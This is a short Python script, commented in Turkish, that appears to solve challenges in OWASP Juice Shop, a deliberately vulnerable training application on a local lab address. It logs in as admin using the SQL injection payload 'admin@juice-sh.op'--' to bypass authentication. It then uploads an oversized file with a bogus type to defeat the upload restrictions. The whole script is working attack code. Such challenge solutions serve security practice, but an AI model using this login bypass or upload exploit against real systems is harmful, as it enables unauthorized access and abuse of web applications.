import requests
import json
import os

session = requests.Session()
jsurl = 'http://192.168.33.10:3000'
# Giriş yapmamız lazımki birşeyler şikayet edelim
auth = json.dumps({'email': 'admin@juice-sh.op\'--', 'password': 'admin123'})
login = session.post('{}/rest/user/login'.format(jsurl),
                     headers={'Content-Type': 'application/json'},
                     data=auth)
if not login.ok:
    raise RuntimeError('Error logging in.')
# dosya oluştur 150kb boyuutlu
with open('said.txt', 'wb') as outfile:
    outfile.truncate(1024 * 150)
with open('said.txt', 'rb') as infile:
    files = {'file': ('herniyse', infile, 'application/json')}
    # dosyayı yükleme
    upload = session.post('{}/file-upload'.format(jsurl), files=files)
    if not upload.ok:
        raise RuntimeError('Dosya Yüklemede Hata Oluştu.')
# Cleanup
os.remove('said.txt')